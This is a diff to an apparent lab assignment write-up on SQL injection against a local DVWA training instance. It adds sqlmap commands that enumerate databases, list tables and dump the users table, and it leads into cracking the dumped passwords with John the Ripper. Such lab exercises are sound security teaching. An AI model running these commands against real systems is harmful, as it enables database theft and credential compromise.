@@ -198,9 +198,38 @@ sudo apt install sqlmap
 
 Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli/?id=1`
 
+5. Get information about all available databases
+
+```bash
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --dbs
+```
+
+![image](https://github.com/user-attachments/assets/0a9fd479-4d89-43ba-9f3a-56db673d3400)
+
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
+
+## 1. Choice Database is dvwa and Use sqlmap to get table 
+
+```bash
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa --tables
+```
+
+![image](https://github.com/user-attachments/assets/13a09125-e859-4705-8e9c-50f30622f3be)
+
+## 2. Choice Database is Users and  use sqlmap to get  users information
+
+
+```bash
+sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=8i0tfhbnhtb8oe03hmukldr8n3; security=medium " --data="id=1&Submit=Submit" --batch -D dvwa -T users --dump
+```
+
+![image](https://github.com/user-attachments/assets/70f0eef2-adaa-4242-b3d2-279322f1da2b)
+
+
+
+
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
